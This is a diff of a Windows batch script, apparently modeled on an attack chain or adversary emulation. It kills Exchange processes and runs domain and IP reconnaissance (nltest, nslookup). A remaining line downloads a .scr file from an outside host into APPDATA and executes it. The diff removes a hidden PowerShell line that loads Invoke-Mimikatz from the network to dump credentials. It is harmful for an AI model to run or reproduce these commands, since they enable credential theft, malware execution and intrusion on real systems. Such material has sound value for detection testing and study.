@@ -410,7 +410,9 @@ taskkill.exe /f /im Microsoft.Exchange.\*
 ECHO ============================
 ECHO %logonserver%
 ECHO ============================
-cd C:\Users\Default\AppData\Local\ & mkdir Vrtrfetmntest.exe
+cd C:\Users\Default\AppData\Local
+ECHO ============================
+mkdir Vrtrfetmntest.exe
 ECHO ============================
 mkdir k:\windows\system32\fr-FR
 ECHO ============================
@@ -426,7 +428,6 @@ nslookup whatismyip.com
 ECHO ============================
 nltest /dclist:abc.local
 ECHO ============================
-cmd.exe /c powershell.exe -W hidden -Exec Bypass -nologo -noprofile -command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')"
 ECHO ============================
 cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofile -command (New-Object System.Net.WebClient).DownloadFile("http://alvarezborja.com/jashebc5ujpsed/podkjfnvb3sidje", "$env:APPDATApole.scr" );Start-Process( "$env:APPDATApole.scr" )
 ECHO ============================
